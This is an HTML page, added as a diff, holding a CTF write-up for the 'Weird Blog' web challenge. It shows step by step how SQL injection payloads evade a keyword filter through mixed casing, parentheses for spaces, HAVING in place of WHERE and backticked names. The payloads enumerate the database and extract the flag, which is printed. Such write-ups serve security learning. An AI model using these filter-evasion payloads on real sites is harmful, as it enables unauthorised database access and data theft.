@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Write UP | Weird Blog - CTF Walkthrough</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <div class="cardCtf">
+        <img alt="logo-ctf" src="https://i.pinimg.com/736x/11/25/63/112563fbab114c06a733fde26bb9153e.jpg">
+        <div class="info-ctf">
+            <p>PlaTform : <span>CyberTalent</span></p>
+            <p>Category : <span>Web Security</span></p>
+            <p>Difficulty : <span class="l-hard">Hard</span></p>
+        </div>
+    </div>
+
+    <div class="me">
+        <img src="https://i.pinimg.com/1200x/77/49/ff/7749ff80faca95728957e9f895cce212.jpg" alt="me-profil"
+            onerror="this.onerror=null; this.style.background='#eef2f7'; this.style.display='flex'; this.style.alignItems='center'; this.style.justifyContent='center'; this.style.fontSize='26px'; this.style.fontFamily='monospace'; this.innerHTML='🐧';">
+        <div class="info-me">
+            <p>My Name : <span>0xdy</span></p>
+            <p>Skills : <span class="skiles">Pentester</span>,
+                <span class="skiles">C</span>,
+                <span class="skiles">RUST</span>, <span class="skiles">GO</span>,
+                <span class="skiles">ASMx64</span>, <span class="skiles">LUA</span>,
+                <span class="skiles">Bug Hunter</span>, <span class="skiles">Networking</span>
+            </p>
+        </div>
+    </div>
+
+    <div class="writUp">
+
+        <p class="text">. if open CTF u can see normal page for blogs, and u can see form for search</p>
+        <img src="./img/wb.png" alt="wb.png"
+            onerror="this.style.objectFit='cover'; this.style.minHeight='120px'; this.style.background='#fafeff'; this.style.display='flex'; this.style.justifyContent='center'; this.style.alignItems='center'; this.style.fontSize='0.9rem'; this.innerHTML='[ SEARCH ENGINE PREVIEW ]';">
+        <p class="text">After opening the challenge, I was presented with a simple blog application containing a search
+            functionality.</p>
+        <p class="text">.Therefore, I decided to test it for common web vulnerabilities, particularly SQL Injection.</p>
+        <p class="sql">' OR 1=1-- //</p>
+        <p class="text">When I submitted this basic SQL injection payload, the application responded with a <span
+                class="red">Hack Detected </span> msg</p>
+        <img src="./img/hd.png" alt="hack detect"
+            onerror="this.style.background='#fef6f3'; this.style.padding='1rem'; this.style.textAlign='center'; this.style.fontWeight='500'; this.innerHTML='🚨 HACK DETECTED 🚨'; this.style.color='#bc4e3a'; this.style.border='1px solid #f0dbd4';">
+        <p class="text">hmmmmmmmmmmmmm, This was interesting because it indicated the presence of a filtering or
+            detection mechanism.</p>
+        <p class="text">After several tests, I discovered that the application failed to detect SQL keywords written
+            using mixed letter casing.</p>
+        <p class="text">Example</p>
+        <p class="sql">SelEcT, FrOm, UnIoN...</p>
+        <p class="text">However, another restriction was present: spaces were filtered. Fortunately, using parentheses
+            instead of spaces successfully bypassed this limitation.</p>
+        <p class="title">1 - Gathering Database Information</p>
+        <p class="text">To identify the database version, I used the <span>@@version</span> variable</p>
+        <p class="sql">zb'UniOn(SeLeCt(@@VerSion))#</p>
+        <img src="./img/vr.png" alt="vr.png"
+            onerror="this.style.background='#f5fafc'; this.style.fontFamily='monospace'; this.innerHTML='🔧 version: 10.11.4-MariaDB'; this.style.padding='0.8rem'; this.style.textAlign='center'; this.style.fontWeight='500';">
+        <p class="text">Additional information could be gathered using the same technique.</p>
+        <p class="title">2- Discovering the Flag Table</p>
+        <p class="text">While enumerating database tables, I noticed that the WHERE keyword was blocked.</p>
+        <p class="text">After some experimentation, I found that replacing WHERE with HAVING achieved the same goal and
+            successfully bypassed the filter.</p>
+        <p class="sql">tes'UniOn(SeLeCT(TaBlE_NamE)FrOm(Information_schema.tables)HaViNg(TaBLE_NaME)LiKe('%FL%'))#</p>
+        <img src="./img/tb.png" alt="tb.png"
+            onerror="this.style.background='#f4faf5'; this.innerHTML='🗂️ Result → FL@g'; this.style.fontWeight='500'; this.style.padding='0.8rem'; this.style.borderRadius='16px';">
+        <p class="sucreselt">Tabel Name : FL@g</p>
+        <p class="title">3- Discovering the Column Name</p>
+        <p class="text">The next step was enumerating column names.</p>
+        <p class="sql">tes'UniOn(SeLeCT(CoLuMn_NamE)FrOm(Information_schema.columns)HaViNg(CoLuMN_NaME)LiKe('%FL@%'))#
+        </p>
+        <img src="./img/tb.png" alt="tb.png"
+            onerror="this.src=''; this.alt='column result'; this.style.background='#f4faf9'; this.innerHTML='📌 Column: FL@g'; this.style.padding='12px'; this.style.fontWeight='500';">
+        <p class="sucreselt">Column Name: FL@g</p>
+        <p class="title">4- Get Flag</p>
+        <p class="text">The final challenge was that both the table name and column name contained the special character
+            '@'.</p>
+        <p class="text">To reference them correctly, I enclosed the identifiers in backticks.</p>
+        <p class="sql">test'UniOn(SEleCt(`FL@g`)FroM(`FL@g`))#</p>
+        <p class="flag">Flag = {Th3_W31rd3sT_BL0G_3V3r}</p>
+    </div>
+
+    <div class="linkCTF">
+        <a href="https://cybertalents.com/challenges/web/weird-blog" target="_blank" rel="noopener noreferrer">🔗
+            CyberTalent | Weird Blog Challenge</a>
+    </div>
+
+</body>
+
+</html>
